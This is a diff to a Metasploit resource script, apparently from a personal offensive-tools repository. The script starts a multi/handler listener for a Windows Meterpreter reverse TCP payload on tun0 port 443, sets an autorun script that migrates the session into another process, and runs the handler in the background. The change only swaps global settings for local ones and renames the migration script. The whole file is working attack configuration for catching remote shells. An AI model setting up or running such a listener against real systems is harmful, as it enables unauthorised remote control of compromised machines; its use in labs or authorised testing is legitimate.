@@ -1,6 +1,6 @@
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
-setg LHOST tun0
-setg LPORT 443
-set autorunscript ~/tools/repos/w1ld0s-tools/access/msf_scripts/auto_migrate.rc
+set LHOST tun0
+set LPORT 443
+set autorunscript ~/tools/repos/w1ld0s-tools/access/msf_scripts/auto_migrate_met.rc
 exploit -j -z
